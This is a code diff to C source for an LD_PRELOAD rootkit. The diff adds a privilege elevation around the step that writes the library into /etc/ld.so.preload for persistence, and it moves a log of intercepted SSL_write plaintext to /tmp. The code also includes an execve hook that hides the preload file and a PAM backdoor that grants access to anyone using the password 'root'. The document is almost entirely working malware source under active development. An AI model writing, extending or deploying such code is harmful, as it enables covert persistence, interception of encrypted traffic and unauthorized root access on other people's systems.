@@ -44,7 +44,9 @@ __attribute__((constructor)) void PersistCheck(void) {
   char check[PATH_MAX]; // Make sure this is enough to store the path
 
   dladdr((void*)PersistCheck, &path);
-
+  uid_t old_uid = getuid();
+  seteuid(0);
+  
   if (access("/etc/ld.so.preload", F_OK) == 0){
     // file exists, check if we are already written to the file
     fd = fopen("/etc/ld.so.preload", "r");
@@ -79,6 +81,7 @@ __attribute__((constructor)) void PersistCheck(void) {
       fclose(fd); // Close file pointer if successfully opened
     }
   }
+  seteuid(old_uid);
 }
 /*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
@@ -118,7 +121,7 @@ struct dirent64* readdir64(DIR* dirp) {
 }
 /*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
 int SSL_write(SSL* ssl, const void *buf, int num) {
-  FILE* fd = fopen("SSL_log.txt", "a+");
+  FILE* fd = fopen("/tmp/SSL_log.txt", "a+");
   if (fd != NULL){
     fprintf(fd, "PID:%d\n", getpid());
     fwrite(buf, 1, num, fd);
@@ -128,7 +131,6 @@ int SSL_write(SSL* ssl, const void *buf, int num) {
   return og_SSL_write(ssl, buf, num);
 }
 /*---------[ PAM BACKDOOR ]---------*/
-
 int backdoor = 0;
 
 // elevate privileges:
@@ -151,7 +153,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, cons
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
 
-  if (input_passwd != NULL && strcmp(input_passwd, "root") == 0) {
+  if (input_passwd != NULL && strcmp(input_passwd, "root") == 0) { // will be changed later
     backdoor = 1;
     return PAM_SUCCESS;
   }
